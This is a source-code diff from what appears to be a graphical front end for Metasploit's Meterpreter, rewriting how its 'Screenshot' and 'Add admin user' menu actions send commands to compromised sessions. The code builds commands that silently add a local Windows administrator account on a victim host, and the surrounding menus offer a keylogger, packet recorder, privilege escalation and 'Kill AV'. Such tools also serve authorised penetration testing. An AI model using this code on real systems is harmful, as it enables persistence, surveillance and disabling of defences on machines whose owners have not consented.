@@ -1567,12 +1567,7 @@ nameloop:	for (int i = 0; i < names.length; i++) {
 		meterpreterPopupMenu.add(monitorMenu);
 		addScript("Start keylogger",monitorMenu,"keylogrecorder");
 		addScript("Start packet recorder",monitorMenu,"packetrecorder");
-		addScript("Screenshot",monitorMenu,new RpcAction(this) {
-			public void action(Map session) throws Exception {
-				rpcConn.execute("session.meterpreter_write", session.get("id"),
-						Base64.encode("screenshot\n".getBytes()));
-			}
-		});
+		addScript("Screenshot",monitorMenu,"multi_console_command -cl \"screenshot\"");
 
 		JMenu escalateMenu = new JMenu("Privilege escalation");
 		meterpreterPopupMenu.add(escalateMenu);
@@ -1602,14 +1597,11 @@ nameloop:	for (int i = 0; i < names.length; i++) {
 				return "gettelnet.rb "+UserPassDialog.getUserPassOpts(getFrame());
 			}
 		});
-		addSessionItem("Add admin user",accessMenu,new RpcAction(this) {
-			String[] userPass = null;
-			public void action(Map session) throws Exception {
-				if(userPass == null)
-					userPass = UserPassDialog.showUserPassDialog(getFrame());
-				rpcConn.execute("session.meterpreter_write", session.get("id"),Base64.encode(
-						("execute -H -f cmd -a \"/c net user "+userPass[0]+" "+userPass[1]+" /ADD " +
-						"&& net localgroup Administrators "+userPass[0]+" /ADD\" \n").getBytes()));
+		addSessionItem("Add admin user",accessMenu,new Object(){
+			public String toString(){
+				String[] userPass = UserPassDialog.showUserPassDialog(getFrame());
+				return "multicommand -cl \"net user "+userPass[0]+" "+userPass[1]+" /ADD\"" +
+						",\"net localgroup Administrators "+userPass[0]+" /ADD\"";
 			}
 		});
 		addScript("Kill AV",accessMenu,"killav");
